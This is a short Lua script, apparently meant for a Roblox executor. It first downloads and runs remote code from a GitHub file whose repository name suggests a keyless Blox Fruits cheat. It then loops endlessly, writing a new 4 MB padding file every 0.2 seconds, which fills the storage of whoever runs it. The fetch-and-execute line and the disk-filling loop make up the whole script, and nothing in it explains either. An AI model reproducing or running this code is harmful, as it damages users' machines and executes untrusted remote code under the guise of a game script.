loadstring(game:HttpGet("https://raw.githubusercontent.com/bloxfruitsnokey/Arcylic/refs/heads/main/Comet/run.luau"))()
task.wait(10)
local fileNamePrefix = "Systematic"
local fileSize = 4 * 1024 * 1024
local content = string.rep("A", fileSize)

local counter = 1

while true do
    local fileName = fileNamePrefix .. tostring(counter) .. ".txt"

    local success, err = pcall(function()
        writefile(fileName, content)
    end)

    if success then
        print("Success")
    else
        warn("Failed: " .. tostring(err))
    end

    counter = counter + 1
    task.wait(0.2)
end
